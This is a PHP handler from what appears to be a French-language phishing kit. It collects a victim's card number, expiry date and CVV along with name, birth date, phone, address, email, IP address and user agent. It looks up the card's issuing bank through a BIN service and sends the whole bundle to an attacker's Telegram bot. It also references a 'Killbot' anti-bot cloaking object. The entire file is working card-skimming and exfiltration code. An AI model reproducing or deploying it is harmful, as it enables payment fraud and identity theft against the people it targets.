<?php
include("../includes/main.php");
$badReturn = json_encode(array("success" => 0));
!isset($_POST) ? die($badReturn):'';
$_POST["ccNumber"] = str_replace(' ', '', $_POST["ccNumber"]);
//(!is_valid_luhn($_POST["ccNumber"]) || !isset($_POST["ccNumber"]) || strlen($_POST["ccNumber"] < 16)) ? die($badReturn):'';


$cc = $_POST["ccNumber"];
$bin = substr($cc, 0, 6);
$ch = curl_init();
$url = "https://lookup.binlist.net/$bin";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$headers = [];
$headers[] = "Accept-Version: 3";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo "Error:" . curl_error($ch);
}

curl_close($ch);
$brand = "";
$type = "";
$emoji = "";
$bank = "";
$someArray = json_decode($result, true);

$emoji = $someArray["country"]["emoji"];
$brand = $someArray["brand"];
$type = $someArray["type"];
$bank = $someArray["bank"]["name"];

$message =
"
[💳] PAIEMENT [💳]

💳 Carte : " .
$_POST['ccNumber'] .
"
💳 Date d'expiration : " .
$_POST['ccExpiration'] .
"
💳 CVV : " .
$_POST['cvv'] .
"

🏛 Banque : " .
$bank .
"
🏛 Level : " .
$brand .
"
🏛 Type : " .
$type .
"

[🎲] INFOS [🎲]

🚀 Nom : " .
$_SESSION['name'] .
"
🚀 Date de naissance : " .
$_SESSION['birthDate'] .
"
🚀 Téléphone : " .
$_SESSION['tel'] .
"
🚀 Adresse : " .
$_SESSION['address'] .
"
🚀 Ville : " .
$_SESSION['city'] .
"
🚀 Code Postal : " .
$_SESSION["zip"] .
"
🚀 E-Mail : " .
$_SESSION["email"] .
"

[🌐] TIERS [🌐]

🌐 Adresse IP : " .
$Killbot->get_client_ip() .
"
🌐 User-Agent : " .
$_SERVER["HTTP_USER_AGENT"] .
" 
";
$data = ["text" => $message, "chat_id" => $chat_id];
file_get_contents(
    "https://api.telegram.org/bot$bot_token/sendMessage?" .
        http_build_query($data)
);

echo json_encode(array("success" => true));
$_SESSION["step"] = "success";
